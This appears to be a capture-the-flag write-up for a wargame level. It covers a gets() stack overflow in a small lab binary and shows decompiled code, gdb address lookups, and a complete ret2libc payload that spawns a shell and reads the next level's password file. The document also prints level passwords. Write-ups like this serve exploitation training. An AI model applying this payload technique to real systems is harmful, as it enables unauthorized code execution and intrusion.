# Level 2
*pass: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77*

```
$ scp -P 4242 level2@192.168.56.108:level2 .
```

```
void main(void)

{
  p();
  return;
}
```

```
void p(void)
{
  uint unaff_retaddr;
  undefined local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}
```
```
(gdb) info proc map
...
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
...
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
```

```
(gdb) info funct system
...
0xb7e6b060  system
...
(gdb) info funct exit
...
0x080483d0  _exit
...
```
p() return address : 0x0804853e\
`/bin/sh` address : 0xb7f8cc58\
`system` address : 0xb7e6b060\
`exit` address : 0x080483d0

```
$ python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xd0\x83\x04\x08" + "\x58\xcc\xf8\xb7"' > /tmp/level2
$ cat /tmp/level2 - | ./level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
